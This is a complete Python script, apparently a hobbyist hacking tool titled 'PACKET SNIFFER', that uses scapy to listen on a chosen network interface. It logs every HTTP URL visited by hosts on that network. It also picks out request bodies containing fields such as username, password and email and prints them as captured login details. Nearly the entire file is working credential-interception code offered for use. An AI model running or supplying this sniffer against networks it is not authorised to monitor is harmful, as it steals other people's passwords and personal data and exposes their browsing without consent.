#!/usr/bin/env python


#MODULES
import subprocess as sp
import scapy.all as scapy
import re
import time
import sys
from scapy.layers import http


#TITLE
sp.call("figlet -f standard 'PACKET SNIFFER'",shell=True)


#WHILE !EXCEPTIONS
try:
    #GLOBAL VARIABLES
    BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END, BOLD, UNDERLINE, PURPLE, CYAN, DARKCYAN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m', '\033[4m', '\033[95m', '\033[96m', '\033[36m'


    #METHODS


    #CLASS-METHODS
    class PacketSniffer:
        def Sniffer(self,interface):
            scapy.sniff(store=False,iface=interface,prn=self.ProcessSniffedPackets)

        def Get_Urls(self,PacketToAnalyze):
            #Capturing Urls
            self.SourceIp = PacketToAnalyze[scapy.IP].src
            self.DestIP = PacketToAnalyze[scapy.IP].dst
            self.Host = PacketToAnalyze[http.HTTPRequest].Host
            self.Path = PacketToAnalyze[http.HTTPRequest].Path
            self.Url = str(self.SourceIp+" visited "+self.Host+self.Path+"("+self.DestIP+")")
            return self.Url

        def Get_Credentials(self,PacketToAnalyze):
            #Capturing Credentials
            if PacketToAnalyze.haslayer(scapy.Raw):
                self.SourceIp = PacketToAnalyze[scapy.IP].src
                self.DestIP = PacketToAnalyze[scapy.IP].dst
                self.Host = PacketToAnalyze[http.HTTPRequest].Host
                self.Path = PacketToAnalyze[http.HTTPRequest].Path
                self.Url = str(self.Host+self.Path)
                self.load = PacketToAnalyze[scapy.Raw].load
                self.useful_fields = ["username","password","user_name","user_password","user","pass","email","mobile","address","email_id"]#Few common names given in name,id attributes
                for self.fields in self.useful_fields:
                    if self.fields in self.load:
                        self.login_det = str(self.SourceIp+" tried to sign-in on "+self.Url+"("+self.DestIP+")"+"\nDetails:\n"+self.load)
                        return self.login_det

        def ProcessSniffedPackets(self,sniffed_packets):
            if sniffed_packets.haslayer(http.HTTPRequest):
                #Usernames,Passwords,EmailId - Most Common Credentials
                self.Credentials_Det = self.Get_Credentials(sniffed_packets)
                if self.Credentials_Det:
                    print("------------------------------------------------------------------------------------------------------------\n"+GREEN+"[+] Captured HTTP Login Detail : \n"+str(self.Credentials_Det)+END)

                #Urls
                self.Detected_Urls = self.Get_Urls(sniffed_packets)
                print("------------------------------------------------------------------------------------------------------------\n"+YELLOW+"[+] Captured HTTP Url : \n"+str(self.Detected_Urls)+END)


    #MAIN
    Ps = PacketSniffer()
    Interface = str(raw_input("Enter the Interface Name"))
    Ps.Sniffer(Interface)


#EXCEPTION HANDLING
except KeyboardInterrupt:
    print(RED+"\n\n[!] KeyboardInterrupt Occured!!!\nExiting ...\n"+END)
    quit()
